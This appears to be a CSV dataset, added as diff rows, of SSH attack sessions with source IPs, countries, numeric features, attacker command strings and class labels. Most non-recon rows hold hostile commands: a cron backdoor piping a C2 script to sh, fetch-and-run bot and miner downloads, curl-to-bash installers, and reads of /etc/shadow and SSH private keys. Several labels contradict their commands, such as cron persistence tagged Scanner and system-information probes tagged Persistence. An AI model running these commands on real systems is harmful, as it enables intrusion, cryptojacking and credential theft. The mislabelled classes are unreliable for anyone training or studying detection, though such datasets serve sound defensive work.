+439bfed98a01496d,218.92.0.158,China,5,1,1,19,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+c220a349a3604a81,157.245.108.55,United States,5,1,5,30,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+8f987e034acb4c0a,193.32.162.8,Russia,5,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+7b59719c11aa4a8b,159.89.49.114,United States,2,1,3,22,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+cc222b5e6329413f,104.236.198.48,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+fc3a7bb3536644dc,159.89.49.114,United States,5,1,3,31,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+8365cc18b04045a2,193.32.162.8,Russia,2,1,1,18,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+54b064d540f44803,159.89.49.114,United States,5,1,3,28,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+8ba2027d108149d5,5.188.86.172,Russia,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+fa696aca0bbf478d,138.197.148.152,United States,4,1,3,19,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+48bc5699c93443e1,92.255.57.210,Russia,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+2357d257874349eb,68.183.39.102,United States,4,1,1,15,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+02daaeb90eaf4e7e,167.71.13.196,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c3afd4f677634685,180.129.12.93,China,1,1,3,9,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+0da3f44b019e4d64,218.92.0.158,China,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+9f81cf96f25d4a31,167.71.13.196,United States,4,1,3,26,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+ace9ea32fbd44bcc,157.245.108.55,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+66dbd70b04a749ef,134.209.82.19,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+80681a0c87ce4218,198.199.65.32,United States,4,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+fab6a8cb07d64f44,5.188.86.172,Russia,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+79c56a0e2df24377,206.189.32.177,United States,5,0,0,18,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+68bd519d5cf94476,134.209.82.19,United States,2,1,2,11,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+fe66fde857254887,167.71.13.196,United States,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c3d03c2f5d924ad9,206.189.32.177,United States,4,1,1,12,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+869eda24ca0c4750,178.128.21.44,Singapore,5,1,1,22,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+25ed4d56cb2341d8,68.183.39.102,United States,4,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+8cbb661322d74e31,185.220.101.45,Germany,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a0ccdf8431af4866,222.186.15.101,China,1,1,5,34,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+b8ab6af0ffad4414,91.240.118.172,Ukraine,4,1,5,40,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+536669c83a574c6f,180.129.12.93,China,5,1,3,29,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+804f14338f2e470b,134.209.82.19,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+0c0f26ebb8e0490a,178.128.21.44,Singapore,3,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+b6b50eafdd9e4bf5,104.236.198.48,United States,2,1,3,22,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+2ae278671be0403d,5.188.86.172,Russia,5,1,3,33,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+7a74691b338c4d07,198.199.65.32,United States,1,1,5,21,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+d3714ca322cf462f,198.199.65.32,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c8ba8faa4cbf4384,185.220.101.45,Germany,3,1,3,23,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+9fb428802d784859,103.99.0.122,India,3,1,2,23,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+b73c35f956514076,159.89.49.114,United States,5,1,1,17,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+84b83d969cb14898,117.21.191.131,China,3,1,1,11,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+eaee1009396541bf,157.245.108.55,United States,1,1,5,22,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+cbf2d9a60ed040f6,180.129.12.93,China,3,1,3,23,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+43a126f3b7174af7,117.21.191.131,China,1,1,2,15,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+5f2a0f749b584b24,92.255.57.210,Russia,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+060578f8f1cd4d85,194.165.16.11,Russia,3,1,2,19,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+984be505f7d64ad8,211.94.20.175,China,5,1,1,20,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+f54194f2280740ce,179.60.150.100,Brazil,4,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+a67be62724fb48f1,178.128.21.44,Singapore,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+9f9f0bd9d0da46e0,222.186.15.101,China,3,1,1,19,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+0874ce3eb9f54815,117.21.191.131,China,1,1,2,12,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+335b176ff96b4c12,45.95.147.236,Netherlands,3,1,5,35,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+c02d9716c10b4c8d,198.199.65.32,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+d0b05fb4bdd04961,91.240.118.172,Ukraine,5,1,3,34,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+541834b8f9b846f3,103.99.0.122,India,5,1,1,22,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+bd8426b9db1c4b4e,206.189.32.177,United States,1,1,3,22,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+d360c409a03f4727,104.236.198.48,United States,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5c9ce0ab98d94b70,193.32.162.8,Russia,2,1,5,28,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+9811e67dc58a4a95,185.220.101.45,Germany,4,1,3,22,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+b3f3921ab033455a,179.60.150.100,Brazil,1,0,0,2,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+15b6b62d8a024ab6,185.220.101.45,Germany,5,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+64ddfffd42f54963,103.99.0.122,India,4,1,2,26,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+5f99f80b1cea4ec7,167.71.13.196,United States,2,1,2,19,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+a5c897b4d05844f7,193.32.162.8,Russia,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+4f6680590fde4784,117.21.191.131,China,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ea8366c5674b45ea,198.199.65.32,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+17ec3918ee6e4f31,5.188.86.172,Russia,2,1,3,21,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+ad70d4799c9c453b,222.186.15.101,China,3,1,1,10,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+eb2eddb76af34830,167.71.13.196,United States,4,1,2,22,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+2822186e8f99449c,68.183.39.102,United States,3,1,5,39,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+690a086e7bee416b,45.95.147.236,Netherlands,2,1,3,27,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+7f97328f27a1455d,180.129.12.93,China,1,1,5,28,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+a9263c4c14034747,179.60.150.100,Brazil,4,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+4952afa21d11495f,198.199.65.32,United States,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a0a3cba00fd8460f,104.236.198.48,United States,2,1,5,29,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+1ad871d981894f8f,80.82.77.139,Netherlands,2,1,3,25,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+237679e10df148aa,185.220.101.45,Germany,4,1,2,19,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+58f7b000da0f4af5,5.188.86.172,Russia,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+41405cb704ee47ca,194.165.16.11,Russia,2,1,1,14,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+cc39055326f7451b,164.92.98.77,United States,5,1,3,36,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+ee8ac2b10d2445d3,164.92.98.77,United States,1,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+c494c482eadb49c4,103.99.0.122,India,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c123fae6213d4350,164.92.98.77,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+d9eb1876734f44ee,159.89.49.114,United States,1,1,1,9,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+8ab2058bfc1f497e,179.60.150.100,Brazil,5,1,5,35,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+7986ac791da14d03,134.209.82.19,United States,3,1,3,20,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+94a44bf9786a41e5,157.245.108.55,United States,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+212fc4a7a2ec4681,178.128.21.44,Singapore,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+b653e5c01e484df8,104.236.198.48,United States,5,1,3,35,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+b9e3ea6d411a450b,58.218.211.36,China,4,1,2,22,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+4c2eb3875c474314,45.142.212.100,Netherlands,2,1,5,26,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+c8e5869f4cda4673,134.209.82.19,United States,2,1,5,41,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+cdd45a4280364ade,103.99.0.122,India,5,1,3,28,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+769f560e52b2491a,211.94.20.175,China,4,1,2,17,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+f8ad61c4bc474e23,104.236.198.48,United States,1,1,2,16,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+b632ee6d97674449,45.142.212.100,Netherlands,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+2d1e6ae83bae43c1,179.60.150.100,Brazil,3,1,3,30,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+bb8eb874b1c8477e,58.218.211.36,China,3,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+bf82cafb58774160,5.188.86.172,Russia,5,1,3,28,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+08c1f2171c634785,104.236.198.48,United States,4,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+5a5c243d54dd430b,103.99.0.122,India,2,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+2040848dcffb4d0e,104.236.198.48,United States,5,0,0,21,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+fc27939517be496f,206.189.32.177,United States,2,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a2c1eb5ba8874876,179.60.150.100,Brazil,1,1,2,14,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+a494240037884dbf,68.183.39.102,United States,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+06bb3d4fc28c4070,193.32.162.8,Russia,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+9339caa05a094dcc,167.71.13.196,United States,2,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+e7e776fc57154d9a,222.186.15.101,China,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a03e6f0eaf174da3,198.199.65.32,United States,2,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+78a2e0e2dcfd435c,117.21.191.131,China,1,1,5,23,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+3f30e411ad824c5f,138.197.148.152,United States,3,1,5,37,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+07a756cd1fa04452,206.189.32.177,United States,5,1,3,26,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+8566318413534386,104.236.198.48,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+190cea84a2274025,159.89.49.114,United States,5,1,5,37,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+55c71844927046ba,193.32.162.8,Russia,5,1,5,38,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+6cb5128fceb34c94,80.82.77.139,Netherlands,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+04e1665aa17544ba,117.21.191.131,China,3,1,3,30,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+d752d64f92194a47,80.82.77.139,Netherlands,4,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+1adc316a4e324685,194.165.16.11,Russia,5,1,3,23,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+d164adc5145d427c,91.240.118.172,Ukraine,2,1,3,18,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+5cde9ffec6b6439e,91.240.118.172,Ukraine,3,1,3,19,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+19bdbd31a8644d07,138.197.148.152,United States,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+6bb82e70f8e84158,104.236.198.48,United States,3,1,3,15,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+5267f652c68047c9,159.89.49.114,United States,4,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+f247430e547c4b0f,193.32.162.8,Russia,4,1,3,29,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+b3c44be9077e48c4,157.245.108.55,United States,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+d806caa3519c42ad,180.129.12.93,China,3,1,3,24,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+d7a503a139d1492f,164.92.98.77,United States,1,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+75e21546ccd6428f,58.218.211.36,China,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+3b762d9db69a4e54,92.255.57.210,Russia,1,1,3,8,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+86c6b73bc84a40a3,194.165.16.11,Russia,2,1,2,15,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+b90786f1d2444850,157.245.108.55,United States,2,1,3,22,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+bb0cadcab6674ac0,103.99.0.122,India,3,1,5,37,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+3716120f3c6840de,222.186.15.101,China,5,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
